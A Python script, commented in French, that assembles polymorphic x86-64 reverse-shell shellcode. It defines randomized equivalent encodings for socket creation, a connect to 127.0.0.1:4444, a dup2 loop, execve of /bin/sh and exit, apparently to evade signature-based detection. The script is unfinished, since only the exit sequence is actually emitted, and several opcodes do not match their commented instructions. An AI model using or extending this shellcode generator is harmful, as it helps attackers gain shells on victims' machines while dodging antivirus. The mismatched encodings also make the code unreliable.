import random

shellcode = ""

###### CREATION SOCKET ######

#mov al, 41 -> B029
#mov al, 40 - add al, 1 -> b0280401
#mov al, 42 - sub al, 1 -> b02a2c01

create_socket_1 = ["B029", "b0280401", "b02a2c01"]

#xor rdi, rdi -> 4831FF
# xor r8, r8 - mov rdi, r8 -> 4D31C04C89C7
# mov dil, 1 - sub dil, 1 -> 40B7014080EF01

create_socket_2 = ["4831FF", "4D31C04C89C7", "40B7014080EF01"]

#add rdi, 2 -> 4883C702
#mov dil, 2 -> 40B702
#mov dil, 3 - sub dil, 1 -> 40B7034080EF01

create_socket_3 = ["4883C702", "40B702", "40B7034080EF01"]

#xor rsi, rsi -> 4831F6
#xor r8, r8 - mov rsi, r8 -> 4D31C04C89C6
# mov sil, 1 - sub sil, 1 -> 40B6014080EE01

create_socket_4 = ["4831F6", "4D31C04C89C6", "40B6014080EE01"]

#add rsi, 1 -> 4883C601
#mov sil, 1 -> 40B601
# mov sil, 2 - sub sil, 1 -> 40B6024080EE01

create_socket_5 = ["4883C601", "40B601", "40B6024080EE01"]

#xor rdx, rdx -> 4831D2
#xor r8, r8 - mov rdx, r8 -> 4D31C04C89C2
#mov dl, 1 - sub dl, 1 -> B20180EA01

create_socket_6 = ["4831D2", "4D31C04C89C2", "B20180EA01"]

#syscall -> 0F05

create_socket_syscall = ["0F05"]

#mov r9, rax -> 4989C1

create_socket_mov = ["4989C1"]



###### CONNEXION SOCKET ######

#push 0x2A -> 6A2A

connexion_socket_1 = ["6A2A"]

#pop rax -> 58

connexion_socket_2 = ["58"]

#mov rdi, r9 -> 4C89CF

connexion_socket_3 = ["4C89CF"]

#push rdx -> 52
#push rdx -> 52

connexion_socket_4 = ["5252"]

#push 0x0101017f -> 687F010101

connexion_socket_5 = ["687F010101"]

#push word 0x5c11 -> D05C11

connexion_socket_6 = ["D05C11"]


#push word 0x02 -> D002

connexion_socket_7 = ["D002"]

#mov rsi, rsp -> 4889E6
# xor r8, r8 - mov r8, rsp - mov rsi, r8 -> 4D31C04989E04C89C6
#xor r9, r9 - mov r9, rsp - mov rsi, r9 -> 4D31C94989E14C89CE

connexion_socket_8 = ["4889E6", "4D31C04989E04C89C6", "4D31C94989E14C89CE"]

#add rdx, 0x10 -> 4883C210

connexion_socket_9 = ["4883C210"]

#syscall -> 0F05

connexion_socket_10 = ["0F05"]

#xor rsi, rsi -> 4831F6
#xor r8, r8 - mov rsi, r8 -> 4D31C04C89C6
# mov sil, 1 - sub sil, 1 -> 40B6014080EE01

connexion_socket_11 = ["4831F6", "4D31C04C89C6", "40B6014080EE01"]

#mov sil, 2 -> 40B602
#xor r8, r8 - mov r8b, 2 - mov sil, r8b -> 4D31C041B0024488C6
#xor r9, r9 - mov r9b, 2 - mov sil, r9b -> 4D31C941B1024488CE

connexion_socket_12 = ["40B602", "4D31C041B0024488C6", "4D31C941B1024488CE"]
# Constant = 7df4 #.loop

###### XOR START LOOP ######

# xor rax, rax [Default] -> 4831c0

# xor r8, r8
# mov rax, r8 -> 4d31c04c89c0 

# mov al, 1
# sub al, 1 -> b0012c01

###### LOOP ######

# mov al, 0x21 -> b021 [Default]

# mov al, 0x11
# add al, 0x10 -> b0110410

# mov al, 0x38
# sub al 0x17 -> b0382c17

# add al, 0xb
# add al, 0xb
# add al, 0xb -> adda0badda0badda0b

# Constante = B0210F0548ffce7df4

 ###### XOR BEFORE SYSCALL ######

# xor rax, rax
# xor rdx, rdx -> 4831c04831d2 [Default]

# xor rdx, rdx
# xor rax, rax -> 4831d24831c0

# mov rax, rdx
# xor rax, rdx
# xor rdx, rdx -> 4889d04831d04831d2

####### /bin/sh ######

# mov rbx, 0x68732f6e69622f2f [Default] -> 48BB2F2F62696E2F7368

# mov rbx, 0x68732f6e584d0a31
# add rbx, 0x111524fe -> 48BB310A4D586E2F73684881C3FE241511 


# mov rbx, 0x68733f5bd2cb3030 -> 48BB3030CBD25B3F73684881EB6969ED0F 
# sub rbx, 0xfed6969

# Constante = 50534889E750574889E6

###### SYSCALL EXECVE ######

# mov al, 0x3b -> B03B

# mov al, 0x3a
# add al, 0x01 -> B03A0401

# Constante = 0f05

 ###### SYSCALL EXIT ######

# mov al, 60 -> B03C
# mov al, 99 - sub al, 39 -> B0632C27
# mov al, 30 - add al, 30 -> B01E041E
# mov dl, 60 - mov rax, rdx -> B23C4889D0

###### XOR LAST SYSCALL ######

# xor rdi, rdi [Default] -> 4831FF

# xor r8, r8
# mov rdx, r8 -> 4D31C04C89C2

# mov dl, 1
# sub dl, 1 -> b20180ea01

# Constante = 0f05

list_exit = ["b03c", "b0632c27", "b01e041e", "b23c4889d0"]

list_xorloop = ["4831c0", "4d31c04c89c0", "b0012c01"]
list_loop = ["b021", "b0110410", "b0382c17", "adda0badda0badda0b"]
list_xor = ["4831c04831d2", "4831d24831c0", "4889d04831d04831d2"]
list_binbash = ["48BB2F2F62696E2F7368", "48BB310A4D586E2F73684881C3FE241511", "48BB3030CBD25B3F73684881EB6969ED0F"]
list_execve = ["B03B", "B03A0401"]
list_xorsyscall = ["4831FF", "4D31C04C89C2", "b20180ea01"]

shellcode += random.choice(list_exit)
print(shellcode)

# Fonction qui permet l'ajout des /xFF/

def shellcodize(s):
    shellcode = 'X'
    shellcode += 'X'.join(a+b for a,b in zip(s[::2], s[1::2]))
    shellcode = shellcode.replace('X', '\\x')
    print(shellcode)

shellcodize(shellcode)
